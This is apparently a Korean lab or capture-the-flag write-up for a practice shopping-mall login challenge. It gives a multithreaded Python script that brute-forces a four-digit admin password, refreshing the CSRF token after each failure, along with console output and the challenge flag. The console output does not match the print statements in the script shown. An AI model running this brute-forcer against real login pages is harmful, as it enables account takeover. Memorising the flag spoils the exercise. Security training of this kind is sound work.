@@ -1,0 +1,152 @@
+========================
+쇼핑몰 3번
+========================
+
+1. 공격 과정
+   1) 문제 3 로그인 요청을 Burp Suite로 확인
+      POST /practice/practice03/login
+      memberid=admin
+      password=0000
+   2) 로그인 실패 시 응답 확인
+      HTTP 302
+      Location: /practice/practice03/login?error
+   3) 실패할 때마다 EQSTORESESSIONID가 새로 발급되고, error 페이지에서 새로운 CSRF 토큰이 생성되는 것을 확인
+   4) 따라서 각 로그인 시도마다 현재 세션에 맞는 CSRF 토큰을 추출하여 다음 요청에 사용
+   5) admin 계정의 비밀번호가 숫자 4자리이므로 0000~9999까지 자동 대입
+   6) 실패 시 302 응답이 발생하지만 4060 입력 시 HTTP 200 응답이 발생하여 로그인 성공으로 판단
+   7) admin / 4060으로 로그인하여 Flag 획득
+
+2. 로그인 성공/실패 판별
+   - 실패
+      HTTP 302
+      Location: /practice/practice03/login?error
+   - 성공
+      HTTP 200
+
+3. 소스코드
+import re
+import threading
+import requests
+import urllib3
+from concurrent.futures import ThreadPoolExecutor
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+BASE = "https://lab.eqst.co.kr:8110"
+LOGIN = BASE + "/practice/practice03/login"
+
+COOKIE = "Burp에서 확인한 현재 Cookie 값"
+
+found = threading.Event()
+
+
+def make_session():
+    s = requests.Session()
+    s.verify = False
+
+    for item in COOKIE.split(";"):
+        item = item.strip()
+
+        if "=" not in item:
+            continue
+
+        name, value = item.split("=", 1)
+        s.cookies.set(name.strip(), value.strip())
+
+    return s
+
+
+def get_csrf(html):
+    m = re.search(
+        r'name="_csrf"\s+value="([^"]+)"',
+        html
+    )
+
+    if m:
+        return m.group(1)
+
+    return None
+
+
+def brute_force(start, end):
+    s = make_session()
+
+    r = s.get(LOGIN, timeout=10)
+    csrf = get_csrf(r.text)
+
+    if not csrf:
+        return
+
+    for i in range(start, end + 1):
+
+        if found.is_set():
+            return
+
+        password = f"{i:04d}"
+
+        data = {
+            "_csrf": csrf,
+            "memberid": "admin",
+            "password": password
+        }
+
+        try:
+            r = s.post(
+                LOGIN,
+                data=data,
+                allow_redirects=False,
+                timeout=10
+            )
+        except requests.RequestException:
+            continue
+
+        location = r.headers.get("Location", "")
+
+        if r.status_code == 302 and "practice03/login?error" in location:
+            r = s.get(location, timeout=10)
+
+            csrf = get_csrf(r.text)
+
+            if not csrf:
+                return
+
+            continue
+
+        if r.status_code == 200:
+            found.set()
+
+            print("========================")
+            print(f"Password found: {password}")
+            print("========================")
+            return
+
+
+ranges = [
+    (0, 1999),
+    (2000, 3999),
+    (4000, 5999),
+    (6000, 7999),
+    (8000, 9999)
+]
+
+with ThreadPoolExecutor(max_workers=5) as executor:
+    futures = [
+        executor.submit(brute_force, start, end)
+        for start, end in ranges
+    ]
+
+    for future in futures:
+        future.result()
+
+4. 콘솔 출력
+C:\Users\EZ\OneDrive\문서>python bruteforcer.py
+Start 6000 ~ 7999
+Start 4000 ~ 5999
+Start 0000 ~ 1999
+Start 2000 ~ 3999
+Start 8000 ~ 9999
+[4000-5999] Unexpected response at 4060 status=200 location=
+
+5. 정답
+   i_hate_csrf_token
+========================
